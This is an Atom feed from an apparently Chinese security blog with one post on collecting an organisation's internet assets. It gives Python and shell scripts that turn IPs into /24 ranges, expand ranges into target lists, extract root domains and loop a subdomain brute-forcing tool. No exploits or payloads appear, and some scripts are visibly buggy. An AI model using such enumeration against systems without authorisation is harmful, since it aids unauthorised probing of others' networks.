<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>0o0o0丶Blog</title>
  
  <subtitle>0o0o0o0o0o0o0o0o0o0</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://10o0.github.io/"/>
  <updated>2018-09-04T09:01:35.160Z</updated>
  <id>https://10o0.github.io/</id>
  
  <author>
    <name>0o0</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>互联网资产搜集思路&lt;更新中...&gt;</title>
    <link href="https://10o0.github.io/2018/09/04/%E4%BA%92%E8%81%94%E7%BD%91%E8%B5%84%E4%BA%A7%E6%90%9C%E9%9B%86%E6%80%9D%E8%B7%AF/"/>
    <id>https://10o0.github.io/2018/09/04/互联网资产搜集思路/</id>
    <published>2018-09-04T06:39:24.000Z</published>
    <updated>2018-09-04T09:01:35.160Z</updated>
    
    <content type="html"><![CDATA[<p>给定域名、部分IP：</p><p>整理成C段IP，</p><figure class="highlight python"><figcaption><span>[] [centos_shell]</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#exp:192.168.1.1  &gt;&gt;&gt;  192.168.1.0/24</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line"><span class="comment"># def cleanCLRFspace(content):</span></span><br><span class="line"><span class="comment"># noCLContext = content.replace('\n','')</span></span><br><span class="line"><span class="comment"># noSpaceCLRFcontext = noCLContext.strip()</span></span><br><span class="line"><span class="comment"># return noSpaceCLRFcontext</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readFile</span><span class="params">()</span>:</span></span><br><span class="line">ipf = open(<span class="string">'./content.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line"><span class="keyword">return</span> ipf</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getLineIP</span><span class="params">(ipf)</span>:</span></span><br><span class="line">ipList = set()</span><br><span class="line">texts = ipf.readlines()</span><br><span class="line"><span class="keyword">for</span> text <span class="keyword">in</span> texts:</span><br><span class="line">ips = re.findall(<span class="string">r'\d+\.\d+?\.\d+?\.\d+?'</span>,text)</span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">ipList.add(ip)</span><br><span class="line"><span class="keyword">return</span> ipList</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ip2c</span><span class="params">(ipNoDup)</span>:</span></span><br><span class="line">ipset = set()</span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ipNoDup:</span><br><span class="line">ipset.add(re.findall(<span class="string">r'\d+?\.\d+?\.\d+?\.'</span>,ip)[<span class="number">0</span>] + <span class="string">'0/24'</span>)</span><br><span class="line">iplist = list(ipset)</span><br><span class="line">iplist.sort()</span><br><span class="line"><span class="keyword">return</span> iplist</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">saveContext</span><span class="params">(s)</span>:</span></span><br><span class="line">wfile = open(<span class="string">'./result.txt'</span>,<span class="string">'w'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">wfile.write(i+<span class="string">'\n'</span>)</span><br><span class="line">wfile.close()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">ipf = readFile()</span><br><span class="line">ipList = getLineIP(ipf)</span><br><span class="line">iplist = ip2c(ipList)</span><br><span class="line">saveContext(iplist)</span><br></pre></td></tr></table></figure><a id="more"></a><figure class="highlight shell"><figcaption><span>[] [centos_shell]</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash">使用方法：./*.sh Cip.txt</span></span><br><span class="line"><span class="meta">#</span><span class="bash">备注：192.168.1.0/24  &gt;&gt;&gt; 192.168.1.0-192.168.1.254  范围IP</span></span><br><span class="line">while read IPRANGE</span><br><span class="line">do</span><br><span class="line">    IP_FILE_NAME=$(echo $IPRANGE | cut -d/ -f1)</span><br><span class="line">    IP_1="$(echo $IPRANGE | cut -d"." -f1-2)."</span><br><span class="line">    IP_3="$(echo $IPRANGE | cut -d"." -f3)"</span><br><span class="line">    MAX_IP_3="$(sipcalc $IPRANGE | awk -F. '/Usable range/&#123;print $6&#125;')"</span><br><span class="line">    for i in $(seq $IP_3 $MAX_IP_3)</span><br><span class="line">    do</span><br><span class="line">        for j in $(seq 1 254)</span><br><span class="line">            do</span><br><span class="line">                echo "$&#123;IP_1&#125;$&#123;i&#125;.$&#123;j&#125;" &gt;&gt;results.txt</span><br><span class="line">            done</span><br><span class="line">    done</span><br><span class="line">done &lt; $1</span><br></pre></td></tr></table></figure><p>一步到位：<br><figure class="highlight shell"><figcaption><span>[] [centos_shell]</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Desc:根据起始IP和结束IP输出IP信息</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Usage:./iprange.sh IP.txt</span></span><br><span class="line"><span class="meta">#</span><span class="bash">notepad++去重：  ^(.*?)$\s+?^(?=.*^\1$)   操作方法如下，快捷键Ctrl+H，在弹出的界面输入表达式，并勾选匹配新行。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">换行处理否则报错    /r/n     /r   全部替换为 /n</span></span><br><span class="line"></span><br><span class="line">while read line0</span><br><span class="line">do</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">echo</span> <span class="variable">$line1</span></span></span><br><span class="line">awk -F $line1  "-" '&#123;print $1,$2&#125;' | while read IPA IPB</span><br><span class="line">do</span><br><span class="line"> </span><br><span class="line">IPA1=`echo $IPA | awk -F '.' '&#123;print $1&#125;'`          </span><br><span class="line">IPA2=`echo $IPA | awk -F '.' '&#123;print $2&#125;'`          </span><br><span class="line">IPA3=`echo $IPA | awk -F '.' '&#123;print $3&#125;'`          </span><br><span class="line">IPA4=`echo $IPA | awk -F '.' '&#123;print $4&#125;'`          </span><br><span class="line">  </span><br><span class="line">IPB1=`echo $IPB | awk -F '.' '&#123;print $1&#125;'`          </span><br><span class="line">IPB2=`echo $IPB | awk -F '.' '&#123;print $2&#125;'`          </span><br><span class="line">IPB3=`echo $IPB | awk -F '.' '&#123;print $3&#125;'`          </span><br><span class="line">IPB4=`echo $IPB | awk -F '.' '&#123;print $4&#125;'`          </span><br><span class="line"></span><br><span class="line">IP4_not_equal()&#123;</span><br><span class="line">for i in `eval echo &#123;$IPA4..$IPB4&#125;`</span><br><span class="line">do</span><br><span class="line">echo $IPA1.$IPA2.$IPA3.$i</span><br><span class="line">done</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">IP3_not_equal () &#123;</span><br><span class="line">for i in  `eval echo &#123;$IPA3..$IPB3&#125;`</span><br><span class="line">do</span><br><span class="line">if [[ $i = $IPA3 ]]</span><br><span class="line">then</span><br><span class="line">eval echo   "192.168.$i.&#123;$IPA4..255&#125;" |xargs -n 1</span><br><span class="line">elif [[ $i = $IPB3 ]]</span><br><span class="line">then</span><br><span class="line">eval echo   "192.168.$i.&#123;1..$IPB4&#125;" |xargs -n 1</span><br><span class="line">else</span><br><span class="line">eval echo  "192.168.$i.&#123;1..255&#125;" | xargs -n 1</span><br><span class="line">fi</span><br><span class="line">done</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">IP2_not_equal()&#123;</span><br><span class="line"><span class="meta">#</span><span class="bash">第二段的变化范围</span></span><br><span class="line">for n in `eval echo &#123;$IPA2..$IPB2&#125;`</span><br><span class="line">do</span><br><span class="line">#如果第二段与IPA的第二段相同</span><br><span class="line">if [ $n = $IPA2 ] </span><br><span class="line">then  </span><br><span class="line">#第三段的变化范围为IPA3到255 </span><br><span class="line">for m in `eval echo &#123;$IPA3..255&#125;`</span><br><span class="line">do</span><br><span class="line">#如果第三段与IPA的第三段相同</span><br><span class="line">if [[ $m = $IPA3 ]]</span><br><span class="line">then</span><br><span class="line">eval echo "$IPA1.$IPA2.$IPA3.&#123;$IPA4..255&#125;" | xargs -n 1</span><br><span class="line">else</span><br><span class="line">eval echo "$IPA1.$IPA2.$m.&#123;1..255&#125;" | xargs -n 1</span><br><span class="line">fi</span><br><span class="line">done</span><br><span class="line">#如果第三段与IPB的第三段相同</span><br><span class="line">elif [ $n = $IPB2 ]</span><br><span class="line">then</span><br><span class="line">#第三段变化范围为0到IPB3</span><br><span class="line">for x in `eval echo &#123;0..$IPB3&#125;` </span><br><span class="line">do</span><br><span class="line">#如果第三段与IPB的第三段相同</span><br><span class="line">if [ $x = $IPB3  ]</span><br><span class="line">then</span><br><span class="line">eval echo "$IPB1.$IPB2.$IPB3.&#123;0..$IPB4&#125;" |xargs -n 1</span><br><span class="line">else</span><br><span class="line">eval echo "$IPB1.$IPB2.$x.&#123;0..255&#125;" |xargs -n 1</span><br><span class="line">fi</span><br><span class="line">done</span><br><span class="line">#如果第二段与IPA和IPB的均不相同</span><br><span class="line">else  </span><br><span class="line">#第三段变化范围</span><br><span class="line">for y in &#123;0..255&#125;</span><br><span class="line">do </span><br><span class="line">echo $IPA1.$n.$y.&#123;0..255&#125; |xargs -n 1</span><br><span class="line">done</span><br><span class="line">fi</span><br><span class="line">done </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">定义pass函数，啥事都不做</span></span><br><span class="line">pass()&#123;</span><br><span class="line">echo ""&gt;/dev/null</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">IP1_not_equal()&#123;</span><br><span class="line"><span class="meta">#</span><span class="bash">IP第一段的范围</span></span><br><span class="line">for d1 in `eval echo &#123;$IPA1..$IPB1&#125;`</span><br><span class="line">do</span><br><span class="line"><span class="meta">#</span><span class="bash">&lt;1&gt;如果第一段与IPA1相同</span></span><br><span class="line">if [[ $d1 = $IPA1 ]]</span><br><span class="line">then</span><br><span class="line">#第二段IP范围为IPA2到255</span><br><span class="line">for d2 in `eval echo &#123;$IPA2..255&#125;`</span><br><span class="line">do</span><br><span class="line">   #&lt;1.1&gt;如果第二段与IPA2相同</span><br><span class="line">   if [[ $d2 = $IPA2 ]]</span><br><span class="line">   then</span><br><span class="line">   #第三段IP范围为IPA3到255</span><br><span class="line">   for d3 in `eval echo &#123;$IPA3..255&#125;`</span><br><span class="line">   do</span><br><span class="line">   #&lt;1.1.1&gt;如果第三段IP与IPA3相同</span><br><span class="line">   if [[ $d3 = $IPA3  ]]</span><br><span class="line">   then</span><br><span class="line">   for d4 in `eval echo &#123;$IPA4..255&#125;`</span><br><span class="line">   do</span><br><span class="line">   echo $d1.$d2.$d3.$d4</span><br><span class="line">   done</span><br><span class="line">   #&lt;1.1.2&gt;如果第三段IP与IP3不同</span><br><span class="line">   else</span><br><span class="line">   for d4 in &#123;0..255&#125;</span><br><span class="line">   do</span><br><span class="line">   echo $d1.$d2.$d3.$d4</span><br><span class="line">   done</span><br><span class="line">   fi</span><br><span class="line">   done</span><br><span class="line">   #&lt;1.2&gt;如果第二段与IPA2不同</span><br><span class="line">   else</span><br><span class="line">   for d3 in &#123;0..255&#125;</span><br><span class="line">   do</span><br><span class="line">   for d4 in &#123;0..255&#125;</span><br><span class="line">   do</span><br><span class="line">   echo $d1.$d2.$d3.$d4</span><br><span class="line">   done</span><br><span class="line">   done</span><br><span class="line">   fi  </span><br><span class="line">done</span><br><span class="line"><span class="meta">#</span><span class="bash">&lt;2&gt;如果第一段IP与IPB相同</span></span><br><span class="line">elif [[ $d1 = $IPB1 ]]</span><br><span class="line">then</span><br><span class="line">#第二段IP的范围为0到IPB2</span><br><span class="line">for d2 in `eval echo &#123;0..$IPB2&#125;`</span><br><span class="line">do</span><br><span class="line">#&lt;2.1&gt;如果第二段IP与IPB相同</span><br><span class="line">if [[ $d2 = $IPB2 ]]</span><br><span class="line">then</span><br><span class="line">#第三段IP范围为0到IPB3</span><br><span class="line">for d3 in `eval echo &#123;0..$IPB3&#125;`</span><br><span class="line">do</span><br><span class="line">#&lt;2.1.1&gt;如果第三段IP与IPB3相同</span><br><span class="line">if [[ $d3 = $IPB3 ]]</span><br><span class="line">then</span><br><span class="line">for d4 in `eval echo &#123;0..$IPB4&#125;`</span><br><span class="line">do</span><br><span class="line">echo $d1.$d2.$d3.$d4</span><br><span class="line">done</span><br><span class="line">#&lt;2.1.2&gt;如果第三段IP与IPB3不同</span><br><span class="line">else</span><br><span class="line">for d4 in &#123;0..255&#125;</span><br><span class="line">do</span><br><span class="line">echo $d1.$d2.$d3.$d4</span><br><span class="line">done</span><br><span class="line">fi</span><br><span class="line">done</span><br><span class="line">#&lt;2.2&gt;如果第二段IP与IPB不相同</span><br><span class="line">else</span><br><span class="line">   #第三段IP范围为&#123;0..255&#125;</span><br><span class="line">   for d3 in &#123;0..255&#125;</span><br><span class="line">   do</span><br><span class="line">   #第四段IP范围为&#123;0.255&#125;</span><br><span class="line">   for d4 in &#123;0.255&#125;</span><br><span class="line">   do</span><br><span class="line">   echo $d1.$d2.$d3.$d4</span><br><span class="line">   done</span><br><span class="line">   done</span><br><span class="line">fi</span><br><span class="line">done     </span><br><span class="line"><span class="meta">#</span><span class="bash">&lt;3&gt;第一段IP与IPA1和IPB1都不相同</span></span><br><span class="line">else</span><br><span class="line">for d2 in &#123;0..255&#125;</span><br><span class="line">do</span><br><span class="line">for d3 in &#123;0..255&#125;</span><br><span class="line">do </span><br><span class="line">for d4 in &#123;0..255&#125;</span><br><span class="line">do</span><br><span class="line">echo $d1.$d2.$d3.$d4</span><br><span class="line">done</span><br><span class="line">done</span><br><span class="line">done</span><br><span class="line">fi   </span><br><span class="line">done    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">print_range_ip()&#123; </span><br><span class="line"><span class="meta">#</span><span class="bash">&lt;1&gt;如果两IP第一段不同</span></span><br><span class="line">if [ $IPA1 != $IPB1 ]</span><br><span class="line">then</span><br><span class="line">IP1_not_equal </span><br><span class="line"><span class="meta">#</span><span class="bash">&lt;2&gt;如果两IP第一段相同</span></span><br><span class="line">else</span><br><span class="line"><span class="meta">#</span><span class="bash">&lt;2.1&gt; 如果第二段IP相同</span></span><br><span class="line">if [ $IPA2 = $IPB2 ]</span><br><span class="line">then</span><br><span class="line">#&lt;2.1.1&gt;如果第三段IP不相同</span><br><span class="line">if [[ $IPA3 != $IPB3 ]]</span><br><span class="line">then</span><br><span class="line">IP3_not_equal </span><br><span class="line">#&lt;2.2.2&gt;如果第三段IP相同</span><br><span class="line">else</span><br><span class="line">IP4_not_equal</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&lt;2.2&gt; 如果第二段IP不相同</span></span><br><span class="line">else</span><br><span class="line">IP2_not_equal</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line">fi</span><br><span class="line">&#125;</span><br><span class="line">print_range_ip &gt;&gt; allssip.txt</span><br><span class="line">done</span><br><span class="line">done &lt; $1</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>IP整理完通过工具扫描</p><p>爆破子域名<br>通过已给url确定一级域名列表：<br><figure class="highlight shell"><figcaption><span>[] [centos_shell]</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/env python</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="meta">#</span><span class="bash">exp:  python *.py  url.txt</span></span><br><span class="line"><span class="meta">#</span><span class="bash">shell去重命令：awk <span class="string">'!a[$0]++'</span> results.txt</span></span><br><span class="line">import sys</span><br><span class="line">import shutil</span><br><span class="line">import dns.name</span><br><span class="line">from tld import get_tld</span><br><span class="line">from tld.utils import update_tld_names</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">def getdomain(url):</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">    domain = dns.name.from_text(url).split(3)[1].to_text(omit_final_dot=True)</span></span><br><span class="line"><span class="meta">#</span><span class="bash">    <span class="built_in">return</span>(domain)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">def getd(url):</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">    update_tld_names()</span></span><br><span class="line"><span class="meta">#</span><span class="bash">    <span class="built_in">return</span>(get_tld(url))</span></span><br><span class="line"></span><br><span class="line">def getdomain(domain):</span><br><span class="line">    DomainSuffix = &#123;'info': None, 'coop': None, 'mil': None, </span><br><span class="line">'int': None, 'xxx': None, 'pro': None, 'aero': None, 'idv': None, </span><br><span class="line">'biz': None, 'edu': None, 'org': None, 'net': None, 'gov': None, </span><br><span class="line">'com': None, 'museum': None, 'name': None&#125;</span><br><span class="line">    Result = []</span><br><span class="line">    domain = domain[0:domain.rfind(':')] #去除端口号// url链接不能加http://</span><br><span class="line">    if domain.count('.') == 1:</span><br><span class="line">    return domain</span><br><span class="line">    PointSplitResult = domain.split('.')</span><br><span class="line">    if len(filter(lambda x: not x.isdigit(), PointSplitResult)) == 0:</span><br><span class="line">    return domain </span><br><span class="line">    if DomainSuffix.has_key(PointSplitResult[-1].lower()):</span><br><span class="line">    Result = PointSplitResult[-2:]</span><br><span class="line">        return '.'.join(Result)</span><br><span class="line">    else:</span><br><span class="line">        if DomainSuffix.has_key(PointSplitResult[-2].lower()):</span><br><span class="line">            Result = PointSplitResult[-3:]</span><br><span class="line">            return '.'.join(Result)</span><br><span class="line">        else:</span><br><span class="line">            Result = PointSplitResult[-2:]</span><br><span class="line">            return '.'.join(Result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == '__main__':</span><br><span class="line">    file = open(sys.argv[1],'r')</span><br><span class="line">    for line in file.readlines():</span><br><span class="line">        line=line.strip('\n')</span><br><span class="line"><span class="meta">#</span><span class="bash">        line = line <span class="keyword">if</span> <span class="string">'://'</span> <span class="keyword">in</span> line <span class="keyword">else</span> <span class="string">'http://'</span> + line</span></span><br><span class="line"><span class="meta">#</span><span class="bash">        <span class="built_in">print</span> line</span></span><br><span class="line">        try:</span><br><span class="line">            print getdomain(line)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            print line+"&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;"</span><br></pre></td></tr></table></figure></p><figure class="highlight shell"><figcaption><span>[] [centos_shell]</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash">usage:&gt;.sh domain.txt</span></span><br><span class="line"></span><br><span class="line">while read line1</span><br><span class="line">do</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">echo</span> <span class="variable">$line1</span></span></span><br><span class="line">python subDomainsBrute.py -i $line1 --full -o $line1</span><br><span class="line">done &lt; $1</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bat"><figcaption><span>[] [centos_shell]</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off&amp;<span class="built_in">setlocal</span> enabledelayedexpansion</span><br><span class="line"><span class="keyword">for</span> /f "delims=" <span class="variable">%%i</span> <span class="keyword">in</span> (domain.txt) <span class="keyword">do</span> <span class="built_in">set</span> "website=<span class="variable">%%i</span>"&amp;<span class="keyword">call</span> :s <span class="variable">!website!</span></span><br><span class="line"><span class="built_in">pause</span></span><br><span class="line">:s</span><br><span class="line">python subDomainsBrute.py -i %<span class="number">1</span> --full -o %<span class="number">1</span></span><br><span class="line"><span class="keyword">goto</span> :eof</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;给定域名、部分IP：&lt;/p&gt;
&lt;p&gt;整理成C段IP，&lt;/p&gt;
